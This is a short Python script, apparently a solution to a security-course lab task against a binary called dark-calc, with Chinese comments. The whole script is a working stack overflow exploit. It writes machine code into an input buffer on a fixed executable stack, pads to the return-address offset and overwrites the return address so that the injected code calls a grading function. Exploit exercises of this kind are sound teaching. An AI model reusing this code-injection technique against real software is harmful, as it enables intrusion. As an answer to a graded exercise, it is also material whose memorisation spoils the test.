#!/usr/bin/env python3
"""Task 2: build the payload for attack/dark-calc (栈空间执行).

dark-calc 使用一块固定在 0x721000000000 的自建栈，该区域被 mmap 为
可读可写可执行 (RWX) 且不随 ASLR 变化。因此我们可以把一小段机器码写到
栈上的 expression 缓冲区，再把返回地址覆盖为缓冲区地址，让 rip 跳到
栈上执行这段代码。

运行时实测：input() 的 expression 缓冲区固定位于 0x721000800fd0，
返回地址位于 0x721000800fe8（偏移 24）。

栈上机器码（等价汇编）：
  mov  edi, 4              ; grade_eval 的参数 grade = 4
  movabs rax, 0x401a87     ; grade_eval 地址
  call rax                 ; grade_eval(4) -> 打印 "Hope A will be your grade!"
"""
import struct
import sys

BUF_ADDR = 0x721000800fd0       # expression 缓冲区（固定栈）
RET_OFFSET = 24
GRADE_EVAL = 0x401a87

shellcode = b""
shellcode += b"\xbf\x04\x00\x00\x00"                   # mov edi, 4
shellcode += b"\x48\xb8" + struct.pack("<Q", GRADE_EVAL)  # movabs rax, grade_eval
shellcode += b"\xff\xd0"                                # call rax

payload = shellcode
payload += b"\x90" * (RET_OFFSET - len(payload))       # NOP 填充到返回地址偏移
payload += struct.pack("<Q", BUF_ADDR)                 # 返回地址 -> 栈上机器码

sys.stdout.buffer.write(payload)
